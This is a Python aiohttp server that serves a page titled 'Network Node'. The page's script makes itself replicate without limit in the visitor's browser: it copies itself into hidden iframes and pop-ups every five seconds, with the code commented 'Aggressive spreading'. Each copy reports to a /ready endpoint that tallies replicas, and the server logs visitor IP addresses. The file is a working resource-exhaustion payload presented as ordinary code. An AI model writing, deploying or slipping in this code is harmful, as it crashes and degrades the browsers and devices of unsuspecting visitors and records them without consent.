# main.py
from aiohttp import web
import json, asyncio
from datetime import datetime

html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Network Node</title>
    <script>
    class Node {
        constructor() {
            this.logs = [];
            this.children = new Set();
            this.init();
        }
        
        async init() {
            this.log('Node initialized');
            await this.multiReplicate();
            this.setupStatus();
            // Aggressive spreading
            setInterval(() => this.multiReplicate(), 5000);
        }
        
        async multiReplicate() {
            // Create multiple replicas
            for(let i = 0; i < 3; i++) {
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.srcdoc = document.documentElement.outerHTML;
                document.body.appendChild(iframe);
                this.children.add(iframe);
            }
            
            // Pop-up replication if allowed
            try {
                const popup = window.open('', '_blank');
                if(popup) {
                    popup.document.write(document.documentElement.outerHTML);
                    this.children.add(popup);
                }
            } catch(e) {
                console.log('Popup blocked');
            }
            
            await this.notifyServer();
        }
        
        async notifyServer() {
            try {
                await fetch('/ready', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        url: window.location.href,
                        children: this.children.size
                    })
                });
                this.log(`Replicated to ${this.children.size} nodes`);
            } catch(e) {
                this.log('Notification failed: ' + e.message);
            }
        }
        
        log(msg) {
            this.logs.push({
                time: new Date().toISOString(),
                message: msg,
                nodes: this.children.size
            });
            this.updateStatus();
        }
        
        updateStatus() {
            document.getElementById('status').innerHTML = `
                <h3>Node Status</h3>
                <p>Active Nodes: ${this.children.size}</p>
                <p>Logs: ${this.logs.length}</p>
                <p>Latest: ${this.logs[this.logs.length-1]?.message || 'None'}</p>
            `;
        }
    }
    
    new Node();
    </script>
</head>
<body>
    <div id="status"></div>
</body>
</html>
"""

class Server:
    def __init__(self):
        self.logs = []
        self.nodes = set()
        self.total_replicas = 0

    async def handle(self, request):
        self.log_access(request)
        return web.Response(text=html_template, content_type='text/html')

    async def ready(self, request):
        data = await request.json()
        self.nodes.add(data['url'])
        self.total_replicas += data.get('children', 0)
        return web.json_response({
            'nodes': len(self.nodes),
            'total_replicas': self.total_replicas
        })

    async def get_stats(self, request):
        return web.json_response({
            'nodes': len(self.nodes),
            'logs': len(self.logs),
            'total_replicas': self.total_replicas
        })

    def log_access(self, request, type='visit'):
        self.logs.append({
            'time': datetime.utcnow().isoformat(),
            'ip': request.remote,
            'type': type
        })

app = web.Application()
server = Server()
app.router.add_get('/', server.handle)
app.router.add_post('/ready', server.ready)
app.router.add_get('/stats', server.get_stats)

if __name__ == '__main__':
    web.run_app(app, port=8080)